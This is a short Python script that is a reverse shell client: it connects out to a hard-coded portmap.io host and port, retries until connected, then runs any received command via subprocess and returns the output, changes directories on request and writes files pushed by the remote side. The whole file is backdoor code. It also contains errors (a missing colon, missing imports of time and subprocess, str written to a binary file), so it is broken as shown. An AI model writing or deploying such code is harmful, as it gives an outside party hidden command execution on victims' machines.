import os
import socket
import random


class connecter:
	def __init__(self):
		self.host= "pramoth-41592.portmap.io"
		self.port = 60067
	def isComputerOnline(self):
		while True:
			s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			try:
				s.connect((self.host,self.port))
				return True
			except:
				s.close()
	def fileSystemAccess(self,path,cont):
		if os.path.exists(path):
			with open(path+f"{random.random()}",'wb') as File:
				File.write(cont)
				File.close()
		else:
			with open(path,'wb') as file:
				file.write(cont)
				file.close()
	def Controller(self)
		
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		if self.isComputerOnline():
			s.connect((self.host,self.port))
		time.sleep(1)
		while True:
			try:
				Msg = s.recv(1024).decode()

				if Msg.split()[0].strip().lower() == "send":
					Name = Msg.split()[1].strip().lower()
					Content = b""
					with open(Name,'wb') as File:
						while True:
							cont = s.recv(1024).decode()
							if not cont:
								break
							File.write(cont)
						File.close()
					print(Name,"File Write SuccessFull !")
				elif Msg.split()[0].strip().lower() == "cd":
					os.chdir(Msg.split()[1])
					s.send(os.getcwd().encode())
				else:
					out = subprocess.getoutput(Msg.strip())
					s.send(out.encode())

			except:
				s.close()
				self.Controller()
c = connecter()
c.Controller()